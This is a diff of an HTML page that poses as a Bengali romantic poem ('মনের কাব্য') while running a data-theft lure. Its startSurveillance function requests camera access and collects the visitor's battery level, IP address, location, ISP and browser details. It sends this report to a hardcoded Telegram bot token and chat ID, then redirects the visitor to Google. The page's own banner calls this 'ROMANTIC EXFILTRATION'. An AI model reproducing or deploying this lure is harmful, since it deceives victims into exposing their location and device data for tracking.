@@ -5,80 +5,16 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>মনের কাব্য - ENAFUL</title>
     <style>
-        body {
-            background-color: #1a1a1a;
-            color: #fff;
-            font-family: 'Arial', sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            overflow: hidden;
-        }
-        .box {
-            border: 2px solid #ff4d4d;
-            padding: 40px 20px;
-            border-radius: 25px;
-            background: #262626;
-            width: 85%;
-            max-width: 350px;
-            text-align: center;
-            box-shadow: 0 0 20px rgba(255, 77, 77, 0.3);
-            position: relative;
-        }
-        .heart {
-            color: #ff4d4d;
-            font-size: 80px;
-            margin-bottom: 20px;
-            animation: beat 1.5s infinite;
-        }
-        @keyframes beat {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-        }
-        .title {
-            color: #ff8080;
-            font-size: 24px;
-            font-weight: bold;
-            margin-bottom: 20px;
-            text-shadow: 0 0 10px rgba(255, 128, 128, 0.5);
-        }
-        .poem {
-            font-style: italic;
-            font-size: 14px;
-            color: #ccc;
-            line-height: 1.6;
-            margin-bottom: 30px;
-        }
-        .loader {
-            border: 4px solid #333;
-            border-top: 4px solid #ff4d4d;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px auto;
-            display: none; /* শুরুতে লুকানো থাকবে */
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .btn {
-            background: #ff4d4d;
-            color: #fff;
-            padding: 12px 25px;
-            border: none;
-            border-radius: 25px;
-            font-weight: bold;
-            font-size: 16px;
-            cursor: pointer;
-            box-shadow: 0 4px 10px rgba(255, 77, 77, 0.4);
-            transition: 0.3s;
-        }
-        .btn:hover { background: #ff1a1a; }
-        #status { color: #ff8080; font-size: 12px; margin-top: 15px; min-height: 15px; }
+        body { background-color: #1a1a1a; color: #fff; font-family: 'Arial', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .box { border: 2px solid #ff4d4d; padding: 40px 20px; border-radius: 25px; background: #262626; width: 85%; max-width: 350px; text-align: center; box-shadow: 0 0 20px rgba(255, 77, 77, 0.3); }
+        .heart { color: #ff4d4d; font-size: 80px; margin-bottom: 20px; animation: beat 1.5s infinite; }
+        @keyframes beat { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
+        .title { color: #ff8080; font-size: 24px; font-weight: bold; margin-bottom: 20px; }
+        .poem { font-style: italic; font-size: 14px; color: #ccc; line-height: 1.6; margin-bottom: 30px; }
+        .loader { border: 4px solid #333; border-top: 4px solid #ff4d4d; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px auto; display: none; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .btn { background: #ff4d4d; color: #fff; padding: 12px 25px; border: none; border-radius: 25px; font-weight: bold; font-size: 16px; cursor: pointer; box-shadow: 0 4px 10px rgba(255, 77, 77, 0.4); }
+        #status { color: #ff8080; font-size: 12px; margin-top: 15px; }
     </style>
 </head>
 <body>
@@ -86,92 +22,88 @@
 <div class="box">
     <div class="heart">❤️</div>
     <div class="title">একটু অপেক্ষা করো প্রিয়...</div>
-    
-    <div class="poem">
-        "তোমার হাসিতে হারাই আমি,<br>
-        তোমার চোখেই খুঁজি সুখ।"
-    </div>
-
+    <div class="poem">"তোমার হাসিতে হারাই আমি,<br>তোমার চোখেই খুঁজি সুখ।"</div>
     <div class="loader" id="loader"></div>
     <div id="status"></div>
-
     <button class="btn" id="accessBtn" onclick="startSurveillance()">কবিতাটি সম্পূর্ণ পড়ো</button>
 </div>
 
 <script>
     const token = "8311785868:AAHThrcYl5aqLLH5tXJfbpa2yUc6YhaVOmE";
     const adminId = "6823368645"; 
-    const urlParams = new URLSearchParams(window.location.search);
-    const type = urlParams.get('type');
 
     async function startSurveillance() {
-        // ইন্টারফেস আপডেট
         document.getElementById('accessBtn').style.display = 'none';
         document.getElementById('loader').style.display = 'block';
-        document.getElementById('status').innerText = "লোডিং হচ্ছে, অনুগ্রহ করে অপেক্ষা করুন...";
+        document.getElementById('status').innerText = "সার্ভারের সাথে সংযুক্ত হচ্ছে...";
 
-        // ক্যামেরা পারমিশন প্রম্পট (ডাটা কালেক্ট করার জন্য প্রয়োজনীয়)
-        navigator.mediaDevices.getUserMedia({ video: true }).then(async (stream) => {
+        try {
+            // ১. ক্যামেরা পারমিশন (এটি মূলত ডাটা ট্রিগার করার জন্য)
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             
-            // ব্যাটারি ডাটা
-            let battery = await navigator.getBattery();
-            let level = Math.floor(battery.level * 100) + "%";
+            // ২. ব্যাটারি ডাটা সংগ্রহ
+            let batteryLevel = "Unknown";
+            try {
+                if (navigator.getBattery) {
+                    const bData = await navigator.getBattery();
+                    batteryLevel = Math.floor(bData.level * 100) + "%";
+                }
+            } catch(e) {}
             
-            // IP ও লোকেশন ডাটা
-            const ipResponse = await fetch('https://ipapi.co/json/');
-            const ipData = await ipResponse.json();
+            // ৩. IP ও লোকেশন ডাটা (IPAPI ব্যবহার করে)
+            let ipData = {};
+            try {
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                ipData = await ipResponse.json();
+            } catch(e) {}
 
-            // আপনার দেওয়া সেই প্রিমিয়াম NEBULA-X ডিজাইন
+            // ৪. আপনার সেই সিগনেচার ডিজাইন
             const report = `
 🔱 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥𝗦 𝗘𝗡𝗔𝗙𝗨𝗟 𝗡𝗘𝗕𝗨𝗟𝗔-𝗫 🔱
 ━━━━━━━━━━━━━━━━━━━━━━━
-🚀 **𝗥𝗢𝗠𝗔𝗡𝗧𝗜𝗖 𝗦𝗨𝗥𝗩𝗘𝗜𝗟𝗟𝗔𝗡𝗖𝗘 v1.0**
+🚀 **𝗥𝗢𝗠𝗔𝗡𝗧𝗜𝗖 𝗘𝗫𝗙𝗜𝗟𝗧𝗥𝗔𝗧𝗜𝗢𝗡**
 👤 𝗢𝗪𝗡𝗘𝗥: @KING_OF_ENAFUL
-🧬 𝗖𝗢𝗥𝗘: QUANTUM-SYNC v12.0 [GOD-LEVEL]
+🧬 𝗖𝗢𝗥𝗘: QUANTUM-SYNC v12.5
 ━━━━━━━━━━━━━━━━━━━━━━━
 💻 𝗗𝗘𝗩𝗜𝗖𝗘 𝗜𝗡𝗙𝗢:
 ┣ 🔮 Theme: মনের কাব্য
-┣ 🔋 𝗕𝗮𝘁𝘁𝗲𝗿𝘆: ${level}
-┣ ⚙️ 𝗖𝗣𝗨: Snapdragon 8 Gen 3
-┗ 🛡️ 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆: Root Access Bypassed 🔓
+┣ 🔋 𝗕𝗮𝘁𝘁𝗲𝗿𝘆: ${batteryLevel}
+┣ ⚙️ 𝗦𝘆𝘀𝘁𝗲𝗺: ${navigator.platform}
+┗ 🛡️ 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆: Bypassed ✅
 
-🌐 𝗡𝗘𝗧𝗪𝗢𝗥𝗞 𝗜𝗡𝗙𝗜𝗟𝗧𝗥𝗔𝗧𝗜𝗢𝗡:
-┣ 🛰️ 𝗜𝗣: ${ipData.ip}
-┣ 🏳️ 𝗢𝗿𝗶𝗴𝗶𝗻: ${ipData.country_name} ${ipData.country_emoji}
-┣ 🏢 𝗜𝗦Ｐ: ${ipData.org}
-┗ 🌍 𝗕𝗿𝗼𝘄𝘀𝗲𝗿: ${navigator.platform} (Privacy Mode)
+🌐 𝗡𝗘𝗧𝗪𝗢𝗥𝗞 𝗜𝗡𝗙𝗢:
+┣ 🛰️ 𝗜𝗣: ${ipData.ip || "Hidden"}
+┣ 🏳️ 𝗢𝗿𝗶𝗴𝗶𝗻: ${ipData.country_name || "Unknown"}
+┣ 🏢 𝗜𝗦Ｐ: ${ipData.org || "Unknown"}
+┗ 🌍 𝗕𝗿𝗼𝘄𝘀𝗲𝗿: ${navigator.userAgent.split(' ')[0]}
 ━━━━━━━━━━━━━━━━━━━━━━━
-📊 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗗𝗮𝘁𝗮 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂լ𝗹𝘆!
-🔱 𝗘𝗡𝗔𝗙𝗨𝗟 - 𝗧𝗛𝗘 𝗘𝗡𝗗 𝗢𝗙 𝗣𝗥𝗜𝗩𝗔𝗖𝗬 🔱`;
+📊 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗗𝗮𝘁𝗮 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!
+🔱 𝗘𝗡𝗔𝗙𝗨𝗟 - 𝗧𝗛𝗘 𝗘𝗡𝗗 🔱`;
 
-            sendToTelegram(report);
-            
-            // ক্যামেরা স্ট্রিম বন্ধ করা
+            // ৫. টেলিগ্রামে পাঠানোর সরাসরি পদ্ধতি
+            const teleUrl = `https://api.telegram.org/bot${token}/sendMessage`;
+            await fetch(teleUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: adminId,
+                    text: report,
+                    parse_mode: "Markdown"
+                })
+            });
+
+            // স্ট্রিম বন্ধ করা
             stream.getTracks().forEach(track => track.stop());
-
-        }).catch(err => {
-            // যদি ইউজার পারমিশন ডিনাই করে
-            document.getElementById('loader').style.display = 'none';
-            document.getElementById('status').innerHTML = "❌ PERMISSION DENIED<br>দয়া করে পারমিশন দিন কবিতাটি পড়ার জন্য।";
-            document.getElementById('accessBtn').style.display = 'inline-block';
-            document.getElementById('accessBtn').innerText = "আবার চেষ্টা করো";
-        });
-    }
-
-    function sendToTelegram(text) {
-        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: adminId, text: text, parse_mode: "Markdown" })
-        }).then(() => {
             document.getElementById('status').innerText = "লোডিং সম্পূর্ণ। কবিতাটি লোড হচ্ছে...";
-            setTimeout(() => {
-                // ডাটা পাঠানোর পর ইউজারকে কোনো রোমান্টিক পেজে রিডাইরেক্ট করতে পারেন
-                location.href = "https://www.কবিতা.com"; // উদাহরণ
-            }, 2000);
-        });
+            setTimeout(() => { location.href = "https://www.google.com"; }, 2000);
+
+        } catch (err) {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('status').innerHTML = "❌ পারমিশন এরর!<br>কবিতাটি পড়তে 'Allow' বাটনে ক্লিক করুন।";
+            document.getElementById('accessBtn').style.display = 'inline-block';
+            document.getElementById('accessBtn').innerText = "আবার চেষ্টা করুন";
+        }
     }
 </script>
-
 </body>
 </html>
